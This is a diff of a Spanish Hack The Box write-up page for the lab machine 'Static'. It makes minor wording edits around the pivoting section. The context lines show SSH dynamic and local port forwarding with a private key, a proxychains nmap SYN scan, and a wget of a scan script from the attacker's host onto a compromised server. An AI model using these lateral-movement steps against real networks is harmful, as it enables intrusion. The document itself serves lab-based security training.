@@ -19,7 +19,7 @@
 <meta itemprop=name content="Static">
 <meta itemprop=description content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web que expone un archivo GZIP corrupto que necesita ser corregido para obtener una clave de TOTP y descargar un archivo VPN. Luego, hay algunos servicios PHP vulnerables que pueden ser comprometidos para llegar a un servidor interno que contiene un archivo binario ejecutable que tiene una vulnerabilidad de Format String. Para comprometer esta máquina se necesitan conocimientos avanzados de pivoting y reenvío de puertos, además de enumeración web, explotación de PHP y explotación de Format String. En este write-up se utiliza un script personalizado de Ruby para automatizar el proceso de descarga del archivos VPN, un script de Python para ganar RCE sobre un servidor web PHP y otro script de Python para la explotación del binario mediante Format String"><meta itemprop=datePublished content="2021-12-18T00:00:00+01:00">
 <meta itemprop=dateModified content="2021-12-18T00:00:00+01:00">
-<meta itemprop=wordCount content="5675">
+<meta itemprop=wordCount content="5685">
 <meta itemprop=keywords content="ftp,cve,php,otp,pivoting,capabilities,path-hijacking,port-forwarding,binary-exploitation,format-string,">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="Static">
@@ -503,7 +503,7 @@ eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 </code></pre></div><p>Tenemos el siguiente esquema de red:</p>
 <p><img src=/images/HTB/Static/Static-network.png alt="Network diagram"></p>
-<p>Podemos conectarnos a <code>pki</code>, que tiene dirección IP <code>192.168.254.3</code>. Para realizar un escaneo de puertos podemos utilizar <code>nmap</code> con <code>proxychains</code> configurando reenvío de puertos dinámico con SSH:</p>
+<p>Podemos conectarnos a <code>pki</code>, que tiene dirección IP <code>192.168.254.3</code>. Para realizar un escaneo de puertos podemos utilizar <code>nmap</code> con <code>proxychains</code> configurando un reenvío de puertos dinámico con SSH:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ssh -fND <span style=color:#ae81ff>9050</span> -i id_rsa www-data@172.20.0.10
 </code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console># proxychains4 -q nmap -sS -p- -vvv -Pn -n 192.168.254.3
 Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
@@ -516,7 +516,7 @@ SYN Stealth Scan Timing: About 0.39% done
 Stats: 0:02:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
 SYN Stealth Scan Timing: About 0.50% done
 ^C
-</code></pre></div><p>La idea era buena, pero el escaneo se demoraba muchísimo. Además, <code>nmap</code> con <code>proxychains</code> no funciona del todo bien a veces.</p>
+</code></pre></div><p>La idea era buena, pero el escaneo se demoraba muchísimo. Además, <code>nmap</code> con <code>proxychains</code> no funciona del todo bien a veces (puede reportar falsos positivos o no reportar puertos abiertos).</p>
 <p>Utilizamos entonces un sencillo <em>script</em> en Bash y lo ejecutamos desde la máquina <code>web</code> para tener menor latencia:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=color:#75715e>#!/usr/bin/env bash
 </span><span style=color:#75715e></span>
@@ -529,7 +529,7 @@ SYN Stealth Scan Timing: About 0.50% done
 www-data@web:/tmp$ wget 172.30.0.9/port_scan.sh
 www-data@web:/tmp$ bash port_scan.sh
 Port: 80 OPEN
-</code></pre></div><p>En menos de 5 minutos tenemos todos los resultados. Solamente el puerto 80 (HTTP) está abierto en <code>pki</code>, el cuál aparecerá como resultado del escaneo en pocos segundos.</p>
+</code></pre></div><p>En menos de 5 minutos tenemos todos los resultados. Solamente el puerto 80 (HTTP) está abierto en <code>pki</code>, el cual aparecerá como resultado del escaneo en pocos segundos.</p>
 <p>Entonces, podemos realizar un reenvío de puertos con SSH (se puede escribir <code>ENTER</code> + <code>~C</code> para salir temporalmente de la sesión de SSH y obtener la interfaz <code>ssh></code>):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@web:/tmp$
 ssh&gt; -L 8080:192.168.254.3:80
